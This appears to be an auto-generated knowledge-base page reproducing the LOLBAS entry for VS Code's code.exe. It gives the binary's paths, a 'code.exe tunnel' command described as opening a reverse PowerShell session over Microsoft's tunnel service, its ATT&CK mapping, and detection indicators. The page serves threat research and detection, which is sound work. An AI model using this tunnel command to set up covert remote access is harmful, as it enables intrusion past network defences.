---
title: "code.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/HonorableMentions/Code.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/HonorableMentions/Code.yml"
build_date: "2026-04-27 19:14:21"
category: "HonorableMentions"
aliases:
  - "code.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1219.001"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

VSCode binary, also portable (CLI) version

## Paths

- `C:\Users\<username>\AppData\Local\Programs\Microsoft VS Code\Code.exe`
- `C:\Program Files\Microsoft VS Code\Code.exe`
- `C:\Program Files (x86)\Microsoft VS Code\Code.exe`

## Commands

### 1. Execute

Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command

```cmd
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```

- Use Case: Reverse PowerShell session over MS provided infrastructure.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1219-remote_access_tools#^t1219001-ide-tunneling|T1219.001: IDE Tunneling]]

## Detections

- IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
- IOC: Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe
- IOC: File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json

## Resources

- {'Link': 'https://badoption.eu/blog/2023/01/31/code_c2.html'}
- {'Link': 'https://code.visualstudio.com/docs/remote/tunnels'}
- {'Link': 'https://code.visualstudio.com/blogs/2022/12/07/remote-even-better'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/HonorableMentions/Code.yml)
